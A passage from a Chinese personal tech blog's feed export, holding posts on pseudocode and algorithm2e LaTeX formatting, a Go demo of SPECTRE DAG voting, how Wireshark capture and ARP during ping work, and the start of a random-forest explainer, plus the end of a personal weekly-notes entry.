title="摘录"></a>摘录</h2><ol><li>踏实一点，不要着急，你想要的岁月都会给你。</li><li>寂寞会发慌，孤独则是饱满的。–蒋勋</li><li>人间忽晚，山河已秋。</li></ol><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>面试的技巧–见 flomo</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>从朋友圈看到的：如果有人一开始就对你表示出超乎寻常的喜爱，那么他也一定会在某天返给你极其的恨意。他心里曾经爱慕的和现在痛恨的，都和你没有关系，那只是他的想象。很有道理，值得反复思考和践行。</li><li>毛姆的《巨匠与杰作》中有这样一段话：<strong>不对别人期待太多</strong>，从一开始就应该认识到，每个人的主要兴趣都是他自身；无论在哪方面，付出才有回报，不管是地位、财富、荣誉、爱情，皆为如此。而且所谓智慧，很大程度上是，<strong>对某个事物的付出不要超出其真正价值</strong>。</li></ol><p>由于平时（白天）交流较少，经常性出现情感溢出的现象，即对特定的人付出超过其身份的感情，但依旧很难表现出来，就这样憋在心里，造成不必要的情绪波动。需要改正。</p><ol start="3"><li>“你的心意过头了，反而会让人为难。”敲不开的门，一直敲是不礼貌的。感情中尤为如此，本就是你情我愿，遇见了，感谢，错过了，坦然。毕竟离开是常态，彼此喜欢是上天恩赐。</li></ol>]]></content>
    
    
    <categories>
      
      <category>周报</category>
      
    </categories>
    
    
    <tags>
      
      <tag>周报</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Basic-scientific-research-series-1-Pseudo-code-specifications</title>
    <link href="/2021/04/15/Basic-scientific-research-series-1-Pseudo-code-specifications_new/"/>
    <url>/2021/04/15/Basic-scientific-research-series-1-Pseudo-code-specifications_new/</url>
    
    <content type="html"><![CDATA[<p>记录一下科研论文中的伪代码。<br>转自：<a href="https://shuzang.github.io/2021/pseudocode-specification/">https://shuzang.github.io/2021/pseudocode-specification/</a></p><a id="more"></a><h2 id="伪代码规范"><a href="#伪代码规范" class="headerlink" title="伪代码规范"></a>伪代码规范</h2><p>伪代码是一种接近自然语言的算法描述形式，其目的是在不涉及具体实现（各种编程语言）的情况下将算法的流程和含义清楚的表达出来，因此它没有一个统一的规范，有的仅仅是在长期的实践过程中形成的一些约定俗成的表达样式。下图是一个简单的例子<a href="https://shuzang.github.io/2021/pseudocode-specification/#fn:1">1</a>，但已经包含了大多数主要元素<br><img src="https://image.hackerjerry.top/Basic-scientific-research-series-1-Pseudo-code-specifications-1.png#clientId=u7f037a6a-77db-4&from=paste&height=380&id=u70552d91&margin=%5Bobject%20Object%5D&originHeight=759&originWidth=668&originalType=url&status=done&style=none&taskId=uef2d862d-a2fb-4d0c-9f58-61f5f43f3ea&width=334"><br>首先需要一个<strong>标题</strong>来描述整个算法，一般还会有一个与之一起的编号。在上图中，算法的标题为「Acesscontrol algorithm flow」，编号为「Algorithm 1」。标题与编号一般位于算法顶部，但也有人放在底部，编号多按全文的算法总数进行索引，但也可以按章节分别进行索引。<br>其次，在正式的算法流之前需要声明<strong>输入和输出</strong>。通常使用关键字 Input 和 Output 来声明，但也有人使用关键字 Data 和 Result。<br>顺序、选择与循环结构是算法的主体。通常，不同的程序块使用缩进来保持结构清晰，但也有不少人使用垂直连接线进行进一步划分，如上图。另外，和编程语言类似，伪代码中的选择和循环使用 if-then-else、while-do 和 for-do 等关键字和结构来描述<a href="https://shuzang.github.io/2021/pseudocode-specification/#fn:2">2</a>，举例如下，其中，每个程序块结束的 end 关键字有人选择写，也有人选择不写。<br><img src="https://image.hackerjerry.top/Basic-scientific-research-series-1-Pseudo-code-specifications-2.png#clientId=u7f037a6a-77db-4&from=paste&height=461&id=u980d4514&margin=%5Bobject%20Object%5D&originHeight=922&originWidth=1121&originalType=url&status=done&style=none&taskId=uebf9d8c3-b7d5-4640-bb35-d608225f8f0&width=560.5"><br>算法流程结构<br>赋值操作一般使用左箭头「&lt;—」表示。A[i] 用来表示数组 A 的第 i 个元素，A[1…j] 则表示下标从 1 到 j 的子数组；函数调用使用函数名+传入参数的形式；返回值使用 return 关键字，这些都和常规编程语言相同。需要注意的是，未声明而使用的变量都可以视为算法内的局部变量，如果是全局变量则需要进行解释，可以在上下文中，也可以使用注释；注释的形式也和传统语言相同，使用 // 或 /<em>……</em>/。<br>算法整体通常使用三线框包围，但也有少部分人使用一个完整的框。<br>伪代码的语句一般不需要在末尾使用分号，但行首通常会添加行号。</p><h2 id="2-LaTeX-包"><a href="#2-LaTeX-包" class="headerlink" title="2. LaTeX 包"></a>2. LaTeX 包</h2><p>latex 书写伪代码主要有三种排版格式：algorithm+algorithmic、algorithm+algorithmicx 以及 algorithm2e<a href="https://shuzang.github.io/2021/pseudocode-specification/#fn:3">3</a>。我们使用<a href="https://www.ctan.org/pkg/algorithm2e">algorithm2e</a>，它提供了垂直连接线，可以去掉 end 关键字，而且写起来更像编程语言，用着非常舒服。<br>引入 algorithm2e 包使用如下语句</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-tag">\<span class="hljs-name">usepackage</span><span class="hljs-string">[options]</span><span class="hljs-string">&#123;algorithm2e&#125;</span></span><br></code></pre></td></tr></table></figure><p>几个重要的 options 如下</p><ol><li>ruled：让标题显示在上面，默认会显示到最下面；</li><li>vlined：默认启用垂直连接线；</li><li>linesnumbered：让算法显示行号，不包括 input 和 output 部分；</li><li>noend：程序块结束不打印 end。</li></ol><p>常用命令如下<a href="https://shuzang.github.io/2021/pseudocode-specification/#fn:4">4</a><br><img src="https://image.hackerjerry.top/Basic-scientific-research-series-1-Pseudo-code-specifications-3.png#clientId=u7f037a6a-77db-4&from=paste&height=372&id=u452ff8fa&margin=%5Bobject%20Object%5D&originHeight=743&originWidth=974&originalType=binary&size=52982&status=done&style=none&taskId=u7814261f-55f6-48b7-b9ab-bede03ce98b&width=487"><br>一个官方的例子如下</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-tag">\<span class="hljs-name">begin</span><span class="hljs-string">&#123;algorithm&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">SetKwData</span><span class="hljs-string">&#123;Left&#125;</span><span class="hljs-string">&#123;left&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">SetKwData</span><span class="hljs-string">&#123;This&#125;</span><span class="hljs-string">&#123;this&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">SetKwData</span><span class="hljs-string">&#123;Up&#125;</span><span class="hljs-string">&#123;up&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">SetKwFunction</span><span class="hljs-string">&#123;Union&#125;</span><span class="hljs-string">&#123;Union&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">SetKwFunction</span><span class="hljs-string">&#123;FindCompress&#125;</span><span class="hljs-string">&#123;FindCompress&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">SetKwInOut</span><span class="hljs-string">&#123;Input&#125;</span><span class="hljs-string">&#123;input&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">SetKwInOut</span><span class="hljs-string">&#123;Output&#125;</span><span class="hljs-string">&#123;output&#125;</span></span><br><br><span class="hljs-tag">\<span class="hljs-name">Input</span><span class="hljs-string">&#123;A bitmap $Im$ of size $w\times l$&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">Output</span><span class="hljs-string">&#123;A partition of the bitmap&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">BlankLine</span></span><br><span class="hljs-tag">\<span class="hljs-name">emph</span><span class="hljs-string">&#123;special treatment of the first line&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">;</span></span><br><span class="hljs-tag">\<span class="hljs-name">For</span><span class="hljs-string">&#123;$i\leftarrow 2$ \KwTo $l$&#125;</span><span class="hljs-string">&#123;</span></span><br><span class="hljs-tag"><span class="hljs-string">\emph&#123;special treatment of the first element of line $i$&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">;</span></span><br><span class="hljs-tag">\<span class="hljs-name">For</span><span class="hljs-string">&#123;$j\leftarrow 2$ \KwTo $w$&#125;</span><span class="hljs-string">&#123;\label&#123;forins&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">Left</span></span><span class="hljs-formula">$<span class="hljs-tag">\<span class="hljs-name">leftarrow</span></span>$</span> <span class="hljs-tag">\<span class="hljs-name">FindCompress</span><span class="hljs-string">&#123;$Im[i,j-1]$&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">;</span></span><br><span class="hljs-tag">\<span class="hljs-name">Up</span></span><span class="hljs-formula">$<span class="hljs-tag">\<span class="hljs-name">leftarrow</span></span>$</span> <span class="hljs-tag">\<span class="hljs-name">FindCompress</span><span class="hljs-string">&#123;$Im[i-1,]$&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">;</span></span><br><span class="hljs-tag">\<span class="hljs-name">This</span></span><span class="hljs-formula">$<span class="hljs-tag">\<span class="hljs-name">leftarrow</span></span>$</span> <span class="hljs-tag">\<span class="hljs-name">FindCompress</span><span class="hljs-string">&#123;$Im[i,j]$&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">;</span></span><br><span class="hljs-tag">\<span class="hljs-name">If</span></span>(<span class="hljs-tag">\<span class="hljs-name">tcp*</span><span class="hljs-string">[h]</span><span class="hljs-string">&#123;O(\Left,\This)==1&#125;</span></span>)&#123;<span class="hljs-tag">\<span class="hljs-name">Left</span></span> compatible with <span class="hljs-tag">\<span class="hljs-name">This</span></span>&#125;&#123;<span class="hljs-tag">\<span class="hljs-name">label</span><span class="hljs-string">&#123;lt&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">lIf</span><span class="hljs-string">&#123;\Left $&lt;$ \This&#125;</span><span class="hljs-string">&#123;\Union&#123;\Left,\This&#125;</span></span>&#125;<br><span class="hljs-tag">\<span class="hljs-name">lElse</span><span class="hljs-string">&#123;\Union&#123;\This,\Left&#125;</span></span>&#125;<br>&#125;<br><span class="hljs-tag">\<span class="hljs-name">If</span></span>(<span class="hljs-tag">\<span class="hljs-name">tcp*</span><span class="hljs-string">[f]</span><span class="hljs-string">&#123;O(\Up,\This)==1&#125;</span></span>)&#123;<span class="hljs-tag">\<span class="hljs-name">Up</span></span> compatible with <span class="hljs-tag">\<span class="hljs-name">This</span></span>&#125;&#123;<span class="hljs-tag">\<span class="hljs-name">label</span><span class="hljs-string">&#123;ut&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">lIf</span><span class="hljs-string">&#123;\Up $&lt;$ \This&#125;</span><span class="hljs-string">&#123;\Union&#123;\Up,\This&#125;</span></span>&#125;<br><span class="hljs-tag">\<span class="hljs-name">tcp</span><span class="hljs-string">&#123;\This is put under \Up to keep tree as flat as possible&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">label</span><span class="hljs-string">&#123;cmt&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">lElse</span><span class="hljs-string">&#123;\Union&#123;\This,\Up&#125;</span></span>&#125;<span class="hljs-tag">\<span class="hljs-name">tcp*</span><span class="hljs-string">[h]</span><span class="hljs-string">&#123;\This linked to \Up&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">label</span><span class="hljs-string">&#123;lelse&#125;</span></span><br>&#125;<br>&#125;<br><span class="hljs-tag">\<span class="hljs-name">lForEach</span><span class="hljs-string">&#123;element $e$ of the line $i$&#125;</span><span class="hljs-string">&#123;\FindCompress&#123;p&#125;</span></span>&#125;<br>&#125;<br><span class="hljs-tag">\<span class="hljs-name">caption</span><span class="hljs-string">&#123;disjoint decomposition&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">label</span><span class="hljs-string">&#123;algo_disjdecomp&#125;</span></span><br><span class="hljs-tag">\<span class="hljs-name">end</span><span class="hljs-string">&#123;algorithm&#125;</span></span><br><br></code></pre></td></tr></table></figure><p>渲染后的样式如下<br><img src="https://image.hackerjerry.top/Basic-scientific-research-series-1-Pseudo-code-specifications-4.png#clientId=u7f037a6a-77db-4&from=paste&height=310&id=u6b501371&margin=%5Bobject%20Object%5D&originHeight=619&originWidth=911&originalType=url&status=done&style=none&taskId=u55db2441-adb1-4199-95e7-79ec5ef27e2&width=455.5"><br>注：当前算法选然后条件语句会带有下划线，主要是因为同时使用了 \ulem 包，产生了冲突，去掉该包即可</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SPECTRE-Coding</title>
    <link href="/2021/04/11/SPECTRE-Coding_new/"/>
    <url>/2021/04/11/SPECTRE-Coding_new/</url>
    
    <content type="html"><![CDATA[<p>虽然这个 paper 可能不是个能 work 的（有很多地方比较牵强，不稳定，且无任何项目声明实现了它），但既然老师要求了，只好硬着头皮上了。</p><a id="more"></a><h1 id="借鉴"><a href="#借鉴" class="headerlink" title="借鉴"></a>借鉴</h1><p>根据经验，我决定先学习一下现有项目中各种共识协议的编写。<br>pow-原理很简单，就是工作量证明，故不用看。<br>pos-选举人制度，具体原理还是可以了解一下的。</p><h2 id="pos–账本共识"><a href="#pos–账本共识" class="headerlink" title="pos–账本共识"></a>pos–账本共识</h2><p>切记，PoS 不是一种确定的定义（算法)，而是一种概念，因此对于不同的平台来说，可以有不同的 PoS 实现。<br>以太坊使用 GHOST，贪婪最重可观察子树协议，作为其分叉选择规则。在 GHOST 协议中，获得投票数最高的分叉将被选为链头（将每个分叉区块及其各自子区块的所有票数计入考虑）。<br>与最长链规则相比， <strong>GHOST 的优点在于能够在网络延迟较高时降低攻击效率，同时最小化链重组的深度</strong>。原因是即使攻击者能够高效地在其分叉链上继续产生区块，尝试使该链成为最长链，GHOST 也会选择另一条票数更高的分叉链。</p><h2 id="pow–挖矿共识"><a href="#pow–挖矿共识" class="headerlink" title="pow–挖矿共识"></a>pow–挖矿共识</h2><p><a href="https://www.yuque.com/docs/share/f47edbdb-8ca4-411b-b78c-1f0ea772ac2c#O7vbh">https://www.yuque.com/docs/share/f47edbdb-8ca4-411b-b78c-1f0ea772ac2c#O7vbh</a><br>挖矿可以设计一个动态调整难度的函数<br><img src="https://image.hackerjerry.top/SPECTRE-Coding-1.png#height=790&id=CCHi2&originHeight=790&originWidth=930&originalType=binary&status=done&style=none&width=930"><br><img src="https://image.hackerjerry.top/SPECTRE-Coding-2.png#height=448&id=Lw1nX&originHeight=448&originWidth=836&originalType=binary&status=done&style=none&width=836"></p><h1 id="SPECTRE"><a href="#SPECTRE" class="headerlink" title="SPECTRE"></a>SPECTRE</h1><p>根据它的伪代码我写了一个 demo,看起来还不错。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Vote</span><span class="hljs-params">(node1 *dag.Blocknode, node2 *dag.Blocknode, graph *Graph)</span> <span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>)</span></span> &#123;<br>voteOfnode1 := <span class="hljs-number">0</span><br>voteOfnode2 := <span class="hljs-number">0</span><br><br><span class="hljs-comment">//遍历全局图</span><br>Graph := graph<br><span class="hljs-comment">//这里graph一开始要传dag.Graph这个全局图，之后可以传past集或者future集</span><br><span class="hljs-keyword">for</span> k, z := <span class="hljs-keyword">range</span> Graph.nodes &#123;<br>_, ok1 := Graph.getFuture(node1)[k]<br>_, ok2 := Graph.getFuture(node2)[k]<br><span class="hljs-keyword">if</span> ok1 &amp;&amp; !ok2 &#123;<br>voteOfnode1 += <span class="hljs-number">1</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> !ok1 &amp;&amp; ok2 &#123;<br>voteOfnode2 += <span class="hljs-number">1</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ok1 &amp;&amp; ok2 &#123;<br><span class="hljs-comment">//取决于past(z)的投票结果</span><br>tem1, tem2 := Vote(node1, node2, Graph.getPast(z))<br><span class="hljs-keyword">if</span> tem1 &gt; tem2 &#123;<br>voteOfnode1 += <span class="hljs-number">1</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>voteOfnode2 += <span class="hljs-number">1</span><br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> !ok1 &amp;&amp; !ok2 &#123;<br><span class="hljs-comment">//z的投票结果取决于future(z)的投票结果</span><br>tem1, tem2 := Vote(node1, node2, getFutureToGraph(Graph.getFuture(z)))<br><span class="hljs-keyword">if</span> tem1 &gt; tem2 &#123;<br>voteOfnode1 += <span class="hljs-number">1</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>voteOfnode2 += <span class="hljs-number">1</span><br>&#125;<br><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> z == node1 &#123;<br>voteOfnode1 += <span class="hljs-number">1</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> z == node2 &#123;<br>voteOfnode2 += <span class="hljs-number">1</span><br>&#125;<br><br>&#125;<br><br><span class="hljs-keyword">return</span> voteOfnode1, voteOfnode2<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>wireshark抓包原理</title>
    <link href="/2021/04/10/wireshark%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86_new/"/>
    <url>/2021/04/10/wireshark%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86_new/</url>
    
    <content type="html"><![CDATA[<p>这几天学院研究生复试，院长出了这道题，就是问了 wireshark 的抓包原理，由于我并不太清楚，所以特此记录。</p><a id="more"></a><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p><img src="https://image.hackerjerry.top/wireshark%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86-1.jpeg#align=left&display=inline&height=463&margin=%5Bobject%20Object%5D&originHeight=463&originWidth=1102&size=0&status=done&style=none&width=1102"></p><p>网络上传输的数据包<strong>通过网卡进入到网络协议分析器系统</strong>。即<strong>Wireshark 使用的网卡数据复制，只要是经过指定网卡都会被抓取</strong>。<br>  每一个协议分析器内部都维护有一个“<strong>跟踪缓冲区</strong>”内存空间区域。它用于<strong>暂存从网络上面复制而来的数据包流</strong>。数据包流从“捕获过滤器”流入到协议分析器的跟踪缓存区中，该缓冲区中的数据包能够在被捕获之后立即查看或是以其他文件格式保持到磁盘上面。比如 Wireshark 协议分析器工具，打开之后，点击[开始捕获]， 然后便可立刻查看捕获到的数据包信息。此时的这些数据包就是放在协议分析器的“跟踪缓冲区”中的。<br>协议分析器所使用的网卡和网卡驱动程序必须能够支持“<strong>混杂模式操作</strong>（Promiscuous Mode Operation）”。因为<strong>只有运行在混杂模式下的网卡才能够捕获到网络中传输到其他设备的“广播数据包、多播数据包、单播数据包以及错误数据包等等”（</strong>支持 VLAN ,单播，多播等），两者一起协同工作。<br><img src="https://image.hackerjerry.top/wireshark%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86-2.png#align=left&display=inline&height=375&margin=%5Bobject%20Object%5D&name=image.png&originHeight=461&originWidth=814&size=234125&status=done&style=none&width=662" alt="image.png"></p><h3 id="混杂模式与监视模式区别"><a href="#混杂模式与监视模式区别" class="headerlink" title="混杂模式与监视模式区别"></a>混杂模式与监视模式区别</h3><p>要弄清混杂模式和监视模式之间的区别：<strong>监视模式仅用于无线卡</strong>，<strong>混杂模式用于无线和有线</strong>。 监控模式使卡无需关联接入点即可侦听无线数据包。 混杂模式使卡可以侦听所有数据包，即使不是针对特定的数据包。</p><blockquote><p>作者：圣手书生黎公子<br>链接：<a href="https://zhuanlan.zhihu.com/p/267640786">https://zhuanlan.zhihu.com/p/267640786</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p></blockquote><h1 id="ping-流程"><a href="#ping-流程" class="headerlink" title="ping 流程"></a>ping 流程</h1><p><img src="https://image.hackerjerry.top/wireshark%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86-3.png#align=left&display=inline&height=265&margin=%5Bobject%20Object%5D&name=image.png&originHeight=265&originWidth=642&size=114805&status=done&style=none&width=642" alt="image.png"><br>在这里，我们搭建了一个 PC+交换机+路由器（文中又称网关）的本地网络</p><p>在一开始，所有机器的 arp 表其实都是空的。<br><img src="https://image.hackerjerry.top/wireshark%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86-4.png#align=left&display=inline&height=429&margin=%5Bobject%20Object%5D&name=image.png&originHeight=523&originWidth=828&size=203088&status=done&style=none&width=679" alt="image.png"><br>而此时，让 PC 去进行 ping（使用 ICMP 协议）自己的网关 192.168.1.1，是可以通的。<br>为什么呢？<br>我们分析一下流程。</p><ol><li>PC 首先封装这个 ICMP 数据包，最里面是 ICMP 的数据，数据外面封装 IPV4 包头，IPV4 包头外面是帧头。格式如下：</li></ol><p><img src="https://image.hackerjerry.top/wireshark%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86-5.png#align=left&display=inline&height=219&margin=%5Bobject%20Object%5D&name=image.png&originHeight=438&originWidth=1550&size=714203&status=done&style=none&width=775" alt="image.png"></p><ol start="2"><li>有个问题是，刚开始 ping 的时候，PC 的 ARP 表项是不知道目的 IP 所对应的 MAC 是多少，那么他怎么获取的呢。</li></ol><p>仔细看数据抓包，有一对 ARP 包：<br><img src="https://image.hackerjerry.top/wireshark%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86-6.png#align=left&display=inline&height=215&margin=%5Bobject%20Object%5D&name=image.png&originHeight=430&originWidth=1547&size=653510&status=done&style=none&width=773.5" alt="image.png"><br>就是在发 ICMP 包之前，系统先发了一个 ARP 包！<br>上面的 ARP 请求包大概意思是：我是 192.168.1.99，我的 MAC 是 aabb.cc00.3000，我想问 192.168.1.1 你的 MAC 是多少，收到请回复收到请回复。<br>在 ARP 请求的过程中，SW 已经学到了 PC 和 R1 的接口 MAC 地址，MAC 地址表项已经形成。<br><img src="https://image.hackerjerry.top/wireshark%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86-7.png#align=left&display=inline&height=148&margin=%5Bobject%20Object%5D&name=image.png&originHeight=295&originWidth=747&size=233011&status=done&style=none&width=373.5" alt="image.png"><br>那么，他是怎么形成的呢？<br>第一步：<br>当 SW 通过 e0/0 端口收到 PC 发来的 ARP 广播包，PC 首先查看自己的 MAC 地址表项，看看数据帧的源 MAC 是否存在于我的 MAC 地址表中，如果没有，那么就直接把 ARP 广播包的源 MAC（aabb.cc00.3000）和接收端口 e0/0 对应起来，形成第一个 MAC 地址表的条目。如果有对应的 MAC 地址条目，SW 就看已经存在的条目和当前的收包端口是否一致，如果不一致就更新 MAC 地址表里面的条目，如果一致就直接泛洪转发这个广播数据帧。<br>第二步：SW 通过 e0/1 端口把这个数据帧发给 R1，R1 收到之后，形成 ARP 表项。<br><img src="https://image.hackerjerry.top/wireshark%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86-8.png#align=left&display=inline&height=62&margin=%5Bobject%20Object%5D&name=image.png&originHeight=124&originWidth=1131&size=180774&status=done&style=none&width=565.5" alt="image.png"><br>R1 拆开外面帧头看到目的 MAC 是自己（广播包本网段内所有人均可接收），R1 就继续拆包，拆开 ARP 头部，看到请求的 MAC 是自己的 IP 地址对应的 MAC，所以 R1 就响应这个 ARP 得请求包。<br><img src="https://image.hackerjerry.top/wireshark%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86-9.png#align=left&display=inline&height=150&margin=%5Bobject%20Object%5D&name=image.png&originHeight=299&originWidth=1066&size=320679&status=done&style=none&width=533" alt="image.png"><br>第三步：响应的 ARP Reply 包发送到 SW 的 e0/1 口，SW1 把单播响应包源 MAC（aabb.cc00.1000）和自己的接收端口 e0/1 口对应起来，形成另外一条 MAC 地址表条目，然后查看到数据帧的目的 MAC 是 aabb.cc00.3000，SW 直接查找自己的 MAC 地址表，发现有对应的条目，直接通过 e0/0 口转发，PC 就收到了响应，获取到了 R1 的 e0/0 接口，也就是 PC 网关的 MAC。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>机器学习之随机森林</title>
    <link href="/2021/04/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97_new/"/>
    <url>/2021/04/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97_new/</url>
    
    <content type="html"><![CDATA[<p>tags: []<br>categories: []<br>cover: “”<br>​</p><hr><p>这里记录一下 AI 作品赛里接触到的随机森林算法。</p><a id="more"></a><h1 id="决策树"><a href="#决策树" class="headerlink" title="决策树"></a>决策树</h1><p>随机森林由许多决策树（decision tree）组成，我们可以将决策树视为一系列关于数据的是/否问题，从而最终得出一个预测类别（或回归情况下的连续值）。 这是一个可解释的模型，因为它非常像我们人类进行分类的过程：在我们做出决定之前（在理想世界中），我们会对可用数据进行一系列的询问。<br>当我们训练决策树时到底发生了什么？可视化可以帮助我们更好地理解决策树，这可以通过 Scikit-Learn 的一个功能来实现（详细信息，请查看 notebook 或这篇文章）。<br><img src="https://image.hackerjerry.top/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97-1.png#height=588&id=XYnoX&name=image.png&originHeight=732&originWidth=837&originalType=binary%E2%88%B6=1&size=369303&status=done&style=none&width=672" alt="image.png"><br>除叶子节点（彩色终端节点）外，所有节点都有 5 个部分：</p><ul><li>基于某个特征的一个值对数据进行的提问，每个提问都有一个真或假的答案可以分裂节点。根据答案，数据点相应地向下移动。</li><li><strong>gini：</strong>节点的 Gini 不纯度。当我们沿着树向下移动时，平均加权基尼不纯度会减少。</li><li><strong>samples</strong>：节点中的观测数据数量。</li><li><strong>value：</strong>每个类中的样本数。例如，根节点中有 2 个样本属于类 0，有 4 个样本属于类 1。</li><li><strong>class：</strong>该节点中大多数点的分类。在叶节点中，即是对节点中所有样本的预测。</li></ul><p><strong>决策树的特征选择</strong>一般有 3 种量化方法：<strong>信息增益、信息增益率、基尼指数</strong>。</p><h2 id="信息增益"><a href="#信息增益" class="headerlink" title="信息增益"></a>信息增益</h2><p>在信息论中，<strong>熵</strong>表示随机变量不确定性的度量。假设随机变量 X 有有限个取值，取值 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618020812451-b0b3a075-5dcb-42d8-bf97-78aa34e4b86e.svg#height=18&id=jf86o&originHeight=18&originWidth=19&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=19"> 对应的概率为 <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618020812589-b6f620aa-d6a0-4990-8de0-93dcf01f721e.svg#height=18&id=fdcbK&originHeight=18&originWidth=19&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=19"> ，则 X 的熵定义为：<br><img src="https://image.hackerjerry.top/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97-2.svg#height=62&id=X43jp&originHeight=62&originWidth=196&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=196"><br>如果某件事<strong>一定发生</strong>（太阳东升西落）或<strong>一定不发生</strong>（钓鱼岛是日本的），则概率为 1 或 0，对应的<strong>熵均为 0</strong>。<br>如果某件事可能发生可能不发生（天要下雨，娘要嫁人），概率介于 0 到 1 之间，熵大于 0。<br>由此可见，<strong>熵越大，随机性越大，结果越不确定</strong>。<br>我们再来看一看<strong>条件熵</strong> <img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1618020812831-53a78260-e1f7-4fe9-bd8b-1b6cbdd6d85d.svg#height=26&id=PpyfP&originHeight=26&originWidth=74&originalType=binary%E2%88%B6=1&size=0&status=done&style=none&width=74"> ，<strong>表示引入随机变量 Y 对于消除 X 不确定性的程度</strong>。假如 X、Y 相互独立，则 X 